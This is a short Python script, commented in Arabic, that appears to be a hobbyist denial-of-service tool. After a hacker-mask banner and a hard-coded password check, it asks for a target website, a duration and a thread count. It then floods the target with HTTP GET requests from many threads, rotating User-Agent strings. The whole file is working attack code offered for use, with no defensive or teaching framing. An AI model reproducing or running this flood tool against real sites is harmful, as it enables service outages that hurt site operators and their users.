import requests
import threading
import random
import time
from colorama import Fore, init
init(autoreset=True)

# قناع هاكر
print(Fore.RED + r"""
           .-        -.
          /            \
         |              |
         |,  .-.  .-.  ,|
         | )(_o/  \o_)( |
         |/     /\     \|
         (_     ^^     _)
          \__|IIIIII|__/
           | \IIIIII/ |
           \          /
            `--------`
""")

# تسجيل دخول
user = input("Username: ")
passwd = input("Password: ")
if user != "zinou" or passwd != "ddos":
    print(Fore.RED + "Access Denied!")
    exit()
print(Fore.GREEN + "Access Granted! Welcome hacker 🔓")

# إدخال رابط الموقع
target = input("Target Website (example: https://example.com): ")
duration = int(input("Duration (seconds): "))
threads = int(input("Threads: "))

# هجوم HTTP GET Flood
def http_flood():
    timeout = time.time() + duration
    i = random.choice(["[*]", "[!]", "[#]"])
    while time.time() < timeout:
        try:
            response = requests.get(target, headers={
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                    "Mozilla/5.0 (Linux; Android 10)",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
                ])
            }, timeout=3)
            print(Fore.YELLOW + i + f" HTTP GET Sent! Status: {response.status_code}")
        except:
            print(Fore.YELLOW + i + " Request Failed or Blocked")

# إطلاق الهجوم
for _ in range(threads):
    th = threading.Thread(target=http_flood)
    th.start()
